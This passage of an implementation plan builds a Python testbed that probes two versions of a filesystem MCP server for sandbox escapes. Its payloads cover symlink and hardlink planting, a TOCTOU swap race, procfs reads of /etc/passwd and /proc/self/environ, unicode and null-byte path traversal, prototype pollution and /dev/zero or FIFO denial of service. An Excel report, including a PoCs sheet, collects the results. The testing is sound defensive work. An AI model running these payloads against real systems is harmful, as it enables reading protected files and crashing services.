        StepCall("PRIM", 11, "", "read_file", "/proc/self/root{SANDBOX}/readme.txt",
                 label="Q: procfs self/root prefix handled?"),
        StepCall("PRIM", 12, "", "read_file", None,
                 label="Q: null path — schema rejection or crash?"),
        StepCall("PRIM", 13, "", "read_file", 42,
                 label="Q: integer path — schema rejection?"),
        StepCall("PRIM", 14, "", "read_file", ["{SANDBOX}/readme.txt"],
                 label="Q: array path — schema rejection or type coercion?"),
        StepCall("PRIM", 15, "", "read_file", "a" * 5000,
                 label="Q: very long path — ENAMETOOLONG or truncation?"),
    ]


def run_primitives_phase() -> list[StepResult]:
    print("\n[Phase 2] Primitives")
    for v in SANDBOXES:
        plant_primitives(v)
    return run_calls_both_versions(primitive_calls())
```

- [ ] **Step 3: Exercise it from main**

Temporarily:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    wipe_all()
    results = run_primitives_phase()
    for r in results:
        print(f"  [{r.severity:>8}] {r.label}")
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: 15 probe results. Pay attention to PRIM 2 (the hardlink probe) — if pinned or latest return the canary string, that's a real finding.

- [ ] **Step 4: Revert main() and commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): phase 2 primitive discovery probes"
```

---

## Task 10: Phase 3 — attack chains C1-C5 (prefix, symlinks, loops, dangling)

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add a `Chain` dataclass and chain registry**

```python
# ---------------------------------------------------------------------------
# Phase 3 — Attack chains. Each chain = setup fn + list of StepCall.
# ---------------------------------------------------------------------------

@dataclass
class Chain:
    chain_id: str
    name: str
    hypothesis: str
    setup: "Any"            # callable(version: str) -> None
    calls: "Any"            # callable() -> list[StepCall]


def _plain_setup(version: str) -> None:
    """Default setup: wipe and recreate baseline sandbox + victim canary."""
    wipe_and_recreate(version)
```

- [ ] **Step 2: Define C1 — prefix confusion**

```python
def setup_c1(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    # Create a sibling dir whose name is sandbox + "_evil"
    wsl_bash(f"""
        set -e
        rm -rf {sandbox}_evil
        mkdir -p {sandbox}_evil
        printf '%s' {CANARY_FILE_CONTENT!r} > {sandbox}_evil/loot.txt
    """)


def calls_c1() -> list[StepCall]:
    return [
        StepCall("C1", 1, "mkdir {SANDBOX}_evil && plant loot",
                 "read_file", "{SANDBOX}_evil/loot.txt",
                 label="prefix-confusion — read loot in sibling dir"),
        StepCall("C1", 2, "", "list_directory", "{SANDBOX}_evil",
                 label="prefix-confusion — list sibling dir"),
        StepCall("C1", 3, "", "read_file", "{SANDBOX}_evil/../mcp_attack_328/readme.txt",
                 label="prefix-confusion + traversal back in"),
    ]
```

- [ ] **Step 3: Define C2 — symlink plant → read**

```python
def setup_c2(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"""
        set -e
        ln -sf {victim}/passwd_canary {sandbox}/link_to_canary
    """)


def calls_c2() -> list[StepCall]:
    return [
        StepCall("C2", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/link_to_canary",
                 "read_file", "{SANDBOX}/link_to_canary",
                 label="basic symlink plant → read target"),
        StepCall("C2", 2, "", "list_directory", "{SANDBOX}",
                 label="list shows the symlink?"),
    ]
```

- [ ] **Step 4: Define C3 — symlink chain**

```python
def setup_c3(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"""
        set -e
        ln -sf {victim}/passwd_canary {sandbox}/chain_c
        ln -sf {sandbox}/chain_c {sandbox}/chain_b
        ln -sf {sandbox}/chain_b {sandbox}/chain_a
    """)


def calls_c3() -> list[StepCall]:
    return [
        StepCall("C3", 1, "ln -s chain A->B->C->canary",
                 "read_file", "{SANDBOX}/chain_a",
                 label="3-link symlink chain to canary"),
    ]
```

- [ ] **Step 5: Define C4 — symlink loop DoS**

```python
def setup_c4(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        ln -sf {sandbox}/loop_b {sandbox}/loop_a
        ln -sf {sandbox}/loop_a {sandbox}/loop_b
    """)


def calls_c4() -> list[StepCall]:
    return [
        StepCall("C4", 1, "ln -s A->B, B->A (loop)",
                 "read_file", "{SANDBOX}/loop_a",
                 label="symlink loop — hang or ELOOP?"),
        StepCall("C4", 2, "", "list_directory", "{SANDBOX}/loop_a",
                 label="list on loop target"),
    ]
```

- [ ] **Step 6: Define C5 — dangling symlink info leak**

```python
def setup_c5(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        ln -sf /var/never/exists/secret_target {sandbox}/dangling
    """)


def calls_c5() -> list[StepCall]:
    return [
        StepCall("C5", 1, "ln -s /var/never/exists/secret_target {SANDBOX}/dangling",
                 "read_file", "{SANDBOX}/dangling",
                 label="dangling symlink — does error echo target?"),
    ]
```

- [ ] **Step 7: Register C1–C5 in the chain registry**

Add below the chain definitions:

```python
CHAINS: list[Chain] = [
    Chain("C1", "Prefix confusion",
          "Allow-list check uses startsWith without trailing slash — {SANDBOX}_evil/loot escapes.",
          setup_c1, calls_c1),
    Chain("C2", "Symlink plant → read",
          "Server follows externally-planted symlinks to targets outside sandbox.",
          setup_c2, calls_c2),
    Chain("C3", "Symlink chain",
          "Realpath walks multi-hop symlink chains — A→B→C→canary.",
          setup_c3, calls_c3),
    Chain("C4", "Symlink loop DoS",
          "A→B, B→A loop causes hang or ELOOP.",
          setup_c4, calls_c4),
    Chain("C5", "Dangling symlink info leak",
          "Broken symlink's error message echoes the target path.",
          setup_c5, calls_c5),
]
```

- [ ] **Step 8: Add the chain phase runner**

```python
def run_chains_phase(chains: list[Chain]) -> list[StepResult]:
    print(f"\n[Phase 3] Attack chains ({len(chains)})")
    all_results: list[StepResult] = []
    for chain in chains:
        print(f"\n  {chain.chain_id} — {chain.name}")
        for v in SANDBOXES:
            chain.setup(v)
        all_results.extend(run_calls_both_versions(chain.calls()))
    return all_results
```

- [ ] **Step 9: Smoke-test with just the first five chains**

Temporarily:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    results = run_chains_phase(CHAINS[:5])
    for r in results:
        print(f"  [{r.severity:>8}] {r.chain_id}.{r.step_num} {r.label}")
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: ~9 step results across the 5 chains. Any CRITICAL result on C1 or C2 would indicate a genuine bug — note it.

- [ ] **Step 10: Revert main() and commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): attack chains C1-C5 (prefix, symlinks, loops, dangling)"
```

---

## Task 11: Phase 3 — attack chains C6-C10 (dir-symlink, parent, hardlink, TOCTOU, procfs)

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Define C6 — dir-symlink nested read**

```python
def setup_c6(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    wsl_bash(f"""
        set -e
        ln -sf {victim} {sandbox}/victim_link
    """)


def calls_c6() -> list[StepCall]:
    return [
        StepCall("C6", 1, "ln -s {VICTIM} {SANDBOX}/victim_link",
                 "list_directory", "{SANDBOX}/victim_link",
                 label="list dir-symlink pointing outside"),
        StepCall("C6", 2, "", "read_file", "{SANDBOX}/victim_link/passwd_canary",
                 label="read file under dir-symlink"),
    ]
```

- [ ] **Step 2: Define C7 — parent-dir symlink**

```python
def setup_c7(version: str) -> None:
    wipe_and_recreate(version)
    victim = VICTIMS[version]
    sandbox = SANDBOXES[version]
    # Create a grandparent symlink scenario:
    # /tmp/mcp_attack_{ver}_indirect -> /tmp/mcp_attack_{ver}
    wsl_bash(f"""
        set -e
        rm -f {sandbox}_indirect
        ln -sf {sandbox} {sandbox}_indirect
    """)


def calls_c7() -> list[StepCall]:
    return [
        StepCall("C7", 1, "ln -s {SANDBOX} {SANDBOX}_indirect",
                 "read_file", "{SANDBOX}_indirect/readme.txt",
                 label="symlinked parent — does realpath resolve before allow-list?"),
    ]
```

- [ ] **Step 3: Define C8 — HARDLINK ESCAPE (the main bet)**

```python
def setup_c8(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    # Hardlinks share the inode — realpath cannot detect the "target".
    # The server sees a regular file at sandbox/hardlink_to_canary whose
    # content is identical to the victim canary.
    wsl_bash(f"""
        set -e
        ln {victim}/passwd_canary {sandbox}/hardlink_to_canary
    """)


def calls_c8() -> list[StepCall]:
    return [
        StepCall("C8", 1, "ln {VICTIM}/passwd_canary {SANDBOX}/hardlink_to_canary",
                 "read_file", "{SANDBOX}/hardlink_to_canary",
                 label="HARDLINK BET — read canary through inode-aliased file"),
        StepCall("C8", 2, "", "list_directory", "{SANDBOX}",
                 label="does listing reveal the hardlink as normal file?"),
    ]
```

- [ ] **Step 4: Define C9 — TOCTOU race**

```python
def setup_c9(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    # The race target starts as a normal file. A background shell loop
    # swaps it between a normal file and a symlink pointing to the canary.
    # We run the swap loop in a separate wsl process with a hard timeout.
    wsl_bash(f"""
        set -e
        echo 'benign' > {sandbox}/race_target
    """)


def calls_c9() -> list[StepCall]:
    # NB: the swap loop is kicked off in run_chains_phase special-case below.
    calls = []
    for i in range(1, 21):
        calls.append(
            StepCall("C9", i, "background shell rotating race_target file<->symlink",
                     "read_file", "{SANDBOX}/race_target",
                     label=f"race attempt #{i}")
        )
    return calls
```

Add a special helper for the race — a context manager that starts a background swap loop in WSL and kills it on exit:

```python
import contextlib

@contextlib.contextmanager
def swap_loop(version: str):
    """Run a background loop in WSL that swaps race_target between a normal
    file and a symlink to the canary. Bounded by RACE_BUDGET_SEC."""
    sandbox = SANDBOXES[version]
    victim = VICTIMS[version]
    script = f"""
        end=$(( $(date +%s) + {RACE_BUDGET_SEC} ))
        while [ $(date +%s) -lt $end ]; do
            ln -sf {victim}/passwd_canary {sandbox}/race_target.new
            mv {sandbox}/race_target.new {sandbox}/race_target
            echo 'benign' > {sandbox}/race_target.tmp
            mv {sandbox}/race_target.tmp {sandbox}/race_target
        done
    """
    proc = subprocess.Popen(
        ["wsl", "bash", "-lc", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        yield
    finally:
        proc.kill()
        try:
            proc.wait(timeout=5)
        except Exception:
            pass
```

- [ ] **Step 5: Define C10 — procfs pivot**

```python
def setup_c10(version: str) -> None:
    wipe_and_recreate(version)


def calls_c10() -> list[StepCall]:
    return [
        StepCall("C10", 1, "", "read_file", "/proc/self/root/etc/passwd",
                 label="procfs self/root — absolute"),
        StepCall("C10", 2, "", "read_file", "{SANDBOX}/../proc/self/root/etc/passwd",
                 label="procfs via relative from sandbox"),
        StepCall("C10", 3, "", "read_file", "/proc/1/root/etc/passwd",
                 label="pid 1 root view"),
        StepCall("C10", 4, "", "read_file", "/proc/self/cwd/readme.txt",
                 label="procfs self/cwd"),
        StepCall("C10", 5, "", "read_file", "/proc/self/environ",
                 label="process environment leak"),
    ]
```

- [ ] **Step 6: Register C6-C10**

Append to `CHAINS`:

```python
CHAINS.extend([
    Chain("C6", "Dir-symlink nested read",
          "sandbox/victim_link→victim dir; read files under it.",
          setup_c6, calls_c6),
    Chain("C7", "Parent-dir symlink",
          "Server doesn't realpath parents of the allow-list dir.",
          setup_c7, calls_c7),
    Chain("C8", "Hardlink escape",
          "Realpath cannot detect hardlinks; file inside sandbox aliases canary inode.",
          setup_c8, calls_c8),
    Chain("C9", "TOCTOU race",
          "Swap race_target between file and symlink while hammering read_file.",
          setup_c9, calls_c9),
    Chain("C10", "Procfs pivot",
          "Escape via /proc/self/root, /proc/self/cwd, /proc/1/root.",
          setup_c10, calls_c10),
])
```

- [ ] **Step 7: Update `run_chains_phase` to use `swap_loop` for C9**

```python
def run_chains_phase(chains: list[Chain]) -> list[StepResult]:
    print(f"\n[Phase 3] Attack chains ({len(chains)})")
    all_results: list[StepResult] = []
    for chain in chains:
        print(f"\n  {chain.chain_id} — {chain.name}")
        for v in SANDBOXES:
            chain.setup(v)
        if chain.chain_id == "C9":
            # C9 needs the concurrent swap loop running in both sandboxes
            with swap_loop("328"), swap_loop("729"):
                all_results.extend(run_calls_both_versions(chain.calls()))
        else:
            all_results.extend(run_calls_both_versions(chain.calls()))
    return all_results
```

- [ ] **Step 8: Exercise with chains C1–C10**

Temporarily:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    results = run_chains_phase(CHAINS)
    hits = [r for r in results if r.severity in ("CRITICAL", "HIGH")]
    print(f"\n{len(hits)} high/critical hits of {len(results)} steps")
    for r in hits:
        print(f"  [{r.severity}] {r.chain_id}.{r.step_num} {r.reason}")
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: runs to completion in under 3 minutes. Pay close attention to `C8` — if it returns any CRITICAL, that is the hardlink-escape finding we were hunting.

- [ ] **Step 9: Revert main() and commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): attack chains C6-C10 (dir-symlink, hardlink, TOCTOU, procfs)"
```

---

## Task 12: Phase 3 — attack chains C11-C15 (unicode, null-byte, CVE mutations, type confusion, DoS)

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Define C11 — Unicode normalization**

```python
def setup_c11(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    # Plant a file with NFD-encoded 'café' filename; query with NFC below.
    wsl_python(f"""
import os
os.makedirs({sandbox!r}, exist_ok=True)
open({sandbox!r} + '/cafe\\u0301_nfd.txt', 'w').write('NFD-named file\\n')
open({sandbox!r} + '/caf\\u00e9_nfc.txt', 'w').write('NFC-named file\\n')
""")


def calls_c11() -> list[StepCall]:
    return [
        StepCall("C11", 1, "plant NFD file, query NFC",
                 "read_file", "{SANDBOX}/caf\u00e9_nfd.txt",
                 label="NFC query → NFD file"),
        StepCall("C11", 2, "plant NFC file, query NFD",
                 "read_file", "{SANDBOX}/cafe\u0301_nfc.txt",
                 label="NFD query → NFC file"),
        StepCall("C11", 3, "", "read_file", "{SANDBOX}/\uff0e\uff0e/etc/passwd",
                 label="fullwidth .. (U+FF0E) traversal"),
        StepCall("C11", 4, "", "read_file", "{SANDBOX}\u202e/etc/passwd",
                 label="RTL override injection"),
    ]
```

- [ ] **Step 2: Define C12 — null-byte truncation**

```python
def setup_c12(version: str) -> None:
    wipe_and_recreate(version)


def calls_c12() -> list[StepCall]:
    return [
        StepCall("C12", 1, "", "read_file", "{SANDBOX}/readme.txt\x00/etc/passwd",
                 label="null-byte truncation"),
        StepCall("C12", 2, "", "read_file", "{SANDBOX}/readme.txt\x00{VICTIM}/passwd_canary",
                 label="null-byte to victim canary"),
        StepCall("C12", 3, "", "read_file", "{SANDBOX}\x00/../etc/passwd",
                 label="null inside directory segment"),
        StepCall("C12", 4, "", "read_file", "{SANDBOX}/readme.txt\n/etc/passwd",
                 label="CRLF injection"),
    ]
```

- [ ] **Step 3: Define C13 — CVE-53110 mutation family**

```python
def setup_c13(version: str) -> None:
    wipe_and_recreate(version)


def calls_c13() -> list[StepCall]:
    return [
        StepCall("C13", 1, "", "read_file", "{SANDBOX}/....//....//etc/passwd",
                 label="CVE-53110 literal pattern"),
        StepCall("C13", 2, "", "read_file", "{SANDBOX}/.....///.....///etc/passwd",
                 label="5-dot extension"),
        StepCall("C13", 3, "", "read_file", "{SANDBOX}/....\\/....\\/etc/passwd",
                 label="mixed backslash"),
        StepCall("C13", 4, "", "read_file", "{SANDBOX}/%2e%2e%2e%2e//%2e%2e%2e%2e//etc/passwd",
                 label="URL-encoded 4-dot"),
        StepCall("C13", 5, "", "read_file", "{SANDBOX}/....///etc/passwd",
                 label="asymmetric 4-dot"),
        StepCall("C13", 6, "", "read_file", "{SANDBOX}/...//../etc/passwd",
                 label="3-dot with 2-dot chaser"),
    ]
```

- [ ] **Step 4: Define C14 — type confusion / JSON-RPC smuggling**

```python
def setup_c14(version: str) -> None:
    wipe_and_recreate(version)


def calls_c14() -> list[StepCall]:
    return [
        StepCall("C14", 1, "", "read_file", [],
                 label="empty array as path"),
        StepCall("C14", 2, "", "read_file", ["{SANDBOX}/readme.txt"],
                 label="array with one valid path"),
        StepCall("C14", 3, "", "read_file", {"path": "{SANDBOX}/readme.txt"},
                 label="object as path"),
        StepCall("C14", 4, "", "read_file", None,
                 label="null as path"),
        StepCall("C14", 5, "", "read_file", 0,
                 label="integer 0 as path"),
        StepCall("C14", 6, "", "read_file", True,
                 label="boolean true as path"),
        StepCall("C14", 7, "", "read_file", "{SANDBOX}/readme.txt",
                 extra_args={"__proto__": {"polluted": True}},
                 label="prototype pollution extra arg"),
        StepCall("C14", 8, "", "read_file", "{SANDBOX}/readme.txt",
                 extra_args={"path": "{VICTIM}/passwd_canary"},
                 label="duplicate path key in args"),
        StepCall("C14", 9, "", "read_file", "a" * (1024 * 1024),
                 label="1 MB path string"),
    ]
```

- [ ] **Step 5: Define C15 — resource exhaustion**

```python
def setup_c15(version: str) -> None:
    wipe_and_recreate(version)
    sandbox = SANDBOXES[version]
    wsl_bash(f"""
        set -e
        ln -sf /dev/zero {sandbox}/zero_link
        mkfifo {sandbox}/fifo_link || true
        # Long path: 4000 chars of 'a'
        mkdir -p {sandbox}/deep
    """)


def calls_c15() -> list[StepCall]:
    return [
        StepCall("C15", 1, "ln -s /dev/zero {SANDBOX}/zero_link",
                 "read_file", "{SANDBOX}/zero_link",
                 label="/dev/zero via symlink — DoS"),
        StepCall("C15", 2, "mkfifo {SANDBOX}/fifo_link",
                 "read_file", "{SANDBOX}/fifo_link",
                 label="FIFO read — hang DoS"),
        StepCall("C15", 3, "", "read_file", "{SANDBOX}/" + "a" * 4000 + ".txt",
                 label="PATH_MAX-length path"),
        StepCall("C15", 4, "", "list_directory", "{SANDBOX}/" + "/".join(["x"] * 200),
                 label="200-segment deep non-existent path"),
    ]
```

- [ ] **Step 6: Register C11-C15**

```python
CHAINS.extend([
    Chain("C11", "Unicode normalization",
          "NFC ≠ NFD; fullwidth; RTL override mismatch between parser and kernel.",
          setup_c11, calls_c11),
    Chain("C12", "Null-byte / control-char truncation",
          "C-string vs JS-string mismatch in path handling.",
          setup_c12, calls_c12),
    Chain("C13", "CVE-53110 mutation family",
          "Test whether the patch catches only the literal `....//` pattern.",
          setup_c13, calls_c13),
    Chain("C14", "Type confusion / JSON-RPC smuggling",
          "Non-string path, prototype pollution, duplicate keys, 1MB string.",
          setup_c14, calls_c14),
    Chain("C15", "Resource exhaustion",
          "/dev/zero, FIFO hang, PATH_MAX, deep path.",
          setup_c15, calls_c15),
])
```

- [ ] **Step 7: Smoke-run full campaign**

Temporarily:

```python
def main() -> None:
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    results = run_chains_phase(CHAINS)
    by_sev = {}
    for r in results:
        by_sev.setdefault(r.severity, 0)
        by_sev[r.severity] += 1
    print("\nSeverity totals:", by_sev)
```

Run: `uv run python tests/testbed/attack_fs_chains.py`
Expected: full 15-chain campaign completes in under 8 minutes. Print severity totals.

- [ ] **Step 8: Revert main() and commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): attack chains C11-C15 (unicode, null, CVE mutations, types, DoS)"
```

---

## Task 13: Excel writer — all 8 sheets + severity fills

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`

- [ ] **Step 1: Add severity color map and header helper**

Below the phase runners:

```python
# ---------------------------------------------------------------------------
# Excel writer — 8 sheets with severity fills.
# ---------------------------------------------------------------------------

SEVERITY_FILL = {
    "CRITICAL": "FFB3B3",  # red
    "HIGH":     "FFD9B3",  # orange
    "MEDIUM":   "FFF2CC",  # yellow
    "LOW":      "CFE2F3",  # blue
    "INFO":     "FFFFFF",  # none
}
SEVERITY_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]


def _severity_rank(sev: str) -> int:
    return SEVERITY_ORDER.index(sev) if sev in SEVERITY_ORDER else len(SEVERITY_ORDER)


def _write_header(ws, headers: list[str]) -> None:
    from openpyxl.styles import Alignment, Font, PatternFill
    hdr_fill = PatternFill("solid", fgColor="0D1117")
    hdr_font = Font(bold=True, color="FFFFFF", size=10)
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.fill = hdr_fill
        c.font = hdr_font
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.row_dimensions[1].height = 28


def _apply_severity(ws, row_idx: int, sev_col: int, severity: str) -> None:
    from openpyxl.styles import PatternFill, Font
    fill = PatternFill("solid", fgColor=SEVERITY_FILL.get(severity, "FFFFFF"))
    for col in range(1, ws.max_column + 1):
        ws.cell(row_idx, col).fill = fill
    sev_cell = ws.cell(row_idx, sev_col)
    if severity in ("CRITICAL", "HIGH"):
        sev_cell.font = Font(bold=True)
```

- [ ] **Step 2: Sheet 01 — Summary**

```python
def _sheet_summary(wb, results_by_chain: dict[str, list[StepResult]]) -> None:
    ws = wb.create_sheet("01_Summary", 0)
    _write_header(ws, [
        "chain_id", "chain_name", "hypothesis", "result",
        "severity", "verdict", "steps_count", "hits_count",
    ])
    chain_lookup = {c.chain_id: c for c in CHAINS}
    row = 2
    for cid, steps in results_by_chain.items():
        chain = chain_lookup.get(cid)
        if not chain:
            continue
        hits = [s for s in steps if s.severity in ("CRITICAL", "HIGH", "MEDIUM")]
        top_sev = min((s.severity for s in steps), key=_severity_rank, default="INFO")
        result = "FAIL" if any(s.severity in ("CRITICAL", "HIGH") for s in steps) else \
                 "PARTIAL" if hits else "PASS"
        verdict = "; ".join(sorted({s.reason for s in hits})[:3]) or "no bug found"
        values = [cid, chain.name, chain.hypothesis, result,
                  top_sev, verdict, len(steps), len(hits)]
        for col, v in enumerate(values, 1):
            ws.cell(row, col, v)
        _apply_severity(ws, row, 5, top_sev)
        row += 1
    for col, width in enumerate([8, 28, 55, 10, 12, 55, 12, 12], 1):
        ws.column_dimensions[chr(64 + col)].width = width
    ws.freeze_panes = "A2"
```

- [ ] **Step 3: Sheet 02 — Source_Analysis**

```python
def _sheet_source(wb) -> None:
    ws = wb.create_sheet("02_Source_Analysis")
    _write_header(ws, ["version", "function", "code_snippet", "gap_identified", "attack_idea"])
    for row, entry in enumerate(SOURCE_NOTES, 2):
        ws.cell(row, 1, entry["version"])
        ws.cell(row, 2, entry["function"])
        ws.cell(row, 3, truncate(entry["snippet"], 800))
        ws.cell(row, 4, entry["gap_identified"])
        ws.cell(row, 5, entry["attack_idea"])
        ws.row_dimensions[row].height = 80
    for col, width in enumerate([14, 24, 80, 48, 32], 1):
        ws.column_dimensions[chr(64 + col)].width = width
    ws.freeze_panes = "A2"
```

- [ ] **Step 4: Sheets 03 (Recon), 04 (Primitives) — shared layout**

```python
def _sheet_steps(wb, title: str, results: list[StepResult]) -> None:
    from openpyxl.styles import Alignment
    ws = wb.create_sheet(title)
    _write_header(ws, [
        "id", "step", "tool", "input",
        "pinned_output", "pinned_ms",
        "latest_output", "latest_ms",
        "severity", "reason", "regression", "label",
    ])
    for row, r in enumerate(results, 2):
        ws.cell(row, 1, f"{r.chain_id}.{r.step_num}")
        ws.cell(row, 2, r.step_num)
        ws.cell(row, 3, r.tool)
        ws.cell(row, 4, truncate(r.path_repr, 300))
        ws.cell(row, 5, truncate(r.pinned_response, 800))
        ws.cell(row, 6, r.pinned_elapsed_ms)
        ws.cell(row, 7, truncate(r.latest_response, 800))
        ws.cell(row, 8, r.latest_elapsed_ms)
        ws.cell(row, 9, r.severity)
        ws.cell(row, 10, r.reason)
        ws.cell(row, 11, "YES" if r.is_regression else "")
        ws.cell(row, 12, r.label)
        for col in range(1, 13):
            ws.cell(row, col).alignment = Alignment(wrap_text=True, vertical="top")
        ws.row_dimensions[row].height = 90
        _apply_severity(ws, row, 9, r.severity)
    for col, width in enumerate([10, 6, 14, 44, 70, 10, 70, 10, 12, 40, 12, 40], 1):
        ws.column_dimensions[chr(64 + col)].width = width
    ws.freeze_panes = "A2"
```

Use this shared writer for Recon, Primitives, Chain Steps (single function reused).

- [ ] **Step 5: Sheet 06 — Diff**

```python
def _sheet_diff(wb, all_results: list[StepResult]) -> None:
    from openpyxl.styles import Alignment
    ws = wb.create_sheet("06_Diff")
    _write_header(ws, ["id", "input", "pinned_behavior", "latest_behavior",
                       "diff_type", "severity"])
    row = 2
    for r in all_results:
        if not r.is_regression:
            continue
        def classify(text: str) -> str:
            low = text.lower()
            if any(k in low for k in ("access denied", "outside allowed", "error:")):
                return "blocked"
            return "content returned"
        pb, lb = classify(r.pinned_response), classify(r.latest_response)
        if pb == "blocked" and lb == "content returned":
            diff_type = "new_allow_in_latest"
        elif pb == "content returned" and lb == "blocked":
            diff_type = "new_block_in_latest"
        else:
            diff_type = "error_change"
        ws.cell(row, 1, f"{r.chain_id}.{r.step_num}")
        ws.cell(row, 2, truncate(r.path_repr, 200))
        ws.cell(row, 3, truncate(r.pinned_response, 400))
        ws.cell(row, 4, truncate(r.latest_response, 400))
        ws.cell(row, 5, diff_type)
        ws.cell(row, 6, r.severity)
        for col in range(1, 7):
            ws.cell(row, col).alignment = Alignment(wrap_text=True, vertical="top")
        ws.row_dimensions[row].height = 80
        _apply_severity(ws, row, 6, r.severity)
        row += 1
    for col, width in enumerate([10, 44, 60, 60, 22, 12], 1):
        ws.column_dimensions[chr(64 + col)].width = width
    ws.freeze_panes = "A2"
```

- [ ] **Step 6: Sheet 07 — PoCs**

```python
def _sheet_pocs(wb, all_results: list[StepResult]) -> None:
    from openpyxl.styles import Alignment
    ws = wb.create_sheet("07_PoCs")
    _write_header(ws, ["poc_id", "chain_id", "version_affected",
                       "tool", "input", "pinned_output", "latest_output",
                       "severity", "reason"])
    row = 2
    idx = 1
    for r in all_results:
        if r.severity not in ("CRITICAL", "HIGH"):
            continue
        def leaks(text: str) -> bool:
            return CANARY in text or "root:x:" in text or "BEGIN OPENSSH" in text
        affected = []
        if leaks(r.pinned_response): affected.append("v2025.3.28")
        if leaks(r.latest_response): affected.append("v2025.7.29")
        affected_str = ", ".join(affected) or "both (generic)"
        ws.cell(row, 1, f"POC-{idx:02d}")
        ws.cell(row, 2, r.chain_id)
        ws.cell(row, 3, affected_str)
        ws.cell(row, 4, r.tool)
        ws.cell(row, 5, truncate(r.path_repr, 200))
        ws.cell(row, 6, truncate(r.pinned_response, 500))
        ws.cell(row, 7, truncate(r.latest_response, 500))
        ws.cell(row, 8, r.severity)
        ws.cell(row, 9, r.reason)
        for col in range(1, 10):
            ws.cell(row, col).alignment = Alignment(wrap_text=True, vertical="top")
        ws.row_dimensions[row].height = 90
        _apply_severity(ws, row, 8, r.severity)
        row += 1
        idx += 1
    for col, width in enumerate([10, 8, 22, 14, 40, 55, 55, 12, 40], 1):
        ws.column_dimensions[chr(64 + col)].width = width
    ws.freeze_panes = "A2"
```

- [ ] **Step 7: Sheet 08 — Raw (full audit), and the top-level writer**

```python
def _sheet_raw(wb, all_results: list[StepResult]) -> None:
    ws = wb.create_sheet("08_Raw")
    _write_header(ws, [
        "chain_id", "step", "tool", "label", "pre_setup", "path_repr",
        "pinned_response", "pinned_ms", "latest_response", "latest_ms",
        "severity", "reason", "regression",
    ])
    for row, r in enumerate(all_results, 2):
        ws.cell(row, 1, r.chain_id)
        ws.cell(row, 2, r.step_num)
        ws.cell(row, 3, r.tool)
        ws.cell(row, 4, r.label)
        ws.cell(row, 5, r.pre_setup)
        ws.cell(row, 6, r.path_repr)
        ws.cell(row, 7, truncate(r.pinned_response, 2000))
        ws.cell(row, 8, r.pinned_elapsed_ms)
        ws.cell(row, 9, truncate(r.latest_response, 2000))
        ws.cell(row, 10, r.latest_elapsed_ms)
        ws.cell(row, 11, r.severity)
        ws.cell(row, 12, r.reason)
        ws.cell(row, 13, "YES" if r.is_regression else "")
    ws.freeze_panes = "A2"


def write_excel(
    recon: list[StepResult],
    primitives: list[StepResult],
    chain_results: list[StepResult],
) -> None:
    import openpyxl
    wb = openpyxl.Workbook()
    # Remove default sheet
    wb.remove(wb.active)

    # Group chain results by chain_id for the summary
    by_chain: dict[str, list[StepResult]] = {}
    for r in chain_results:
        by_chain.setdefault(r.chain_id, []).append(r)

    _sheet_summary(wb, by_chain)
    _sheet_source(wb)
    _sheet_steps(wb, "03_Recon", recon)
    _sheet_steps(wb, "04_Primitives", primitives)
    _sheet_steps(wb, "05_Chain_Steps", chain_results)
    _sheet_diff(wb, recon + primitives + chain_results)
    _sheet_pocs(wb, recon + primitives + chain_results)
    _sheet_raw(wb, recon + primitives + chain_results)

    wb.save(XLSX_OUT)
    print(f"\nSaved: {XLSX_OUT}")
```

- [ ] **Step 8: Commit**

```bash
git add tests/testbed/attack_fs_chains.py
git commit -m "feat(testbed): excel writer with 8 sheets and severity fills"
```

---

## Task 14: Main orchestration + JSONL audit log + cleanup

**Files:**
- Modify: `tests/testbed/attack_fs_chains.py`
- Modify: `.gitignore`

- [ ] **Step 1: Add JSONL audit writer**

```python
def write_jsonl(all_results: list[StepResult]) -> None:
    with JSONL_OUT.open("w", encoding="utf-8") as f:
        for r in all_results:
            f.write(json.dumps({
                "chain_id": r.chain_id,
                "step_num": r.step_num,
                "tool": r.tool,
                "label": r.label,
                "path_repr": r.path_repr,
                "pinned_response": r.pinned_response,
                "pinned_elapsed_ms": r.pinned_elapsed_ms,
                "latest_response": r.latest_response,
                "latest_elapsed_ms": r.latest_elapsed_ms,
                "severity": r.severity,
                "reason": r.reason,
                "is_regression": r.is_regression,
